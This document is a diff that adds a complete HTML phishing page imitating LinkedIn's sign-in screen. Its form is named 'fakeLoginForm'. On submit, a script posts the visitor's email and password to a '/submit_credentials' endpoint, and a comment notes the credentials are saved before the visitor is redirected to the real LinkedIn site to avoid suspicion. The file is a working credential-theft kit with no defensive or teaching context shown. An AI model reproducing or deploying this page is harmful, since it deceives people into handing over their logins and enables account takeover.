@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn Login</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f3f2ef;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+
+        .logo img {
+            width: 120px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .container h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        .container p {
+            font-size: 14px;
+            margin-bottom: 24px;
+            color: #666;
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 16px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0073b1;
+            box-shadow: 0 0 0 2px rgba(0, 115, 177, 0.2);
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            background-color: #0073b1;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #005582;
+        }
+
+        .forgot-password {
+            margin-top: 16px;
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #0073b1;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .social-buttons {
+            margin-top: 16px;
+            text-align: center;
+        }
+
+        .social-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            margin-bottom: 8px;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background-color: #fff;
+            color: #333;
+            cursor: pointer;
+        }
+
+        .social-button i {
+            margin-right: 8px;
+        }
+
+        .social-button:hover {
+            background-color: #f9f9f9;
+        }
+
+        .signup-link {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .signup-link a {
+            color: #0073b1;
+            text-decoration: none;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/c/ca/LinkedIn_logo_initials.png" alt="LinkedIn Logo">
+    </div>
+    <div class="container">
+        <h1>Sign in</h1>
+        <p>Stay updated on your professional world</p>
+        <form id="fakeLoginForm">
+            <div class="form-group">
+                <input type="email" id="email" name="email" placeholder="Email or Phone" required>
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit">Sign in</button>
+        </form>
+        <div class="forgot-password">
+            <a href="#">Forgot password?</a>
+        </div>
+        <div class="social-buttons">
+            <button class="social-button"><i class="fab fa-google"></i> Sign in with Google</button>
+            <button class="social-button"><i class="fab fa-apple"></i> Sign in with Apple</button>
+        </div>
+        <div class="signup-link">
+            New to LinkedIn? <a href="#">Join now</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('fakeLoginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();  // Stop form from refreshing page immediately
+        
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+        
+            try {
+                const response = await fetch('/submit_credentials', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: new URLSearchParams({ email, password })
+                });
+        
+                const data = await response.json();
+        
+                if (data.error) {
+                    alert('Error: ' + data.error);
+                } else {
+                    // ✅ After saving credentials, now redirect to LinkedIn
+                    window.location.href = "https://www.linkedin.com/";
+                }
+            } catch (error) {
+                console.error('Error submitting credentials:', error);
+                alert('Something went wrong. Please try again.');
+            }
+        });
+        </script>        
+</body>
+</html>
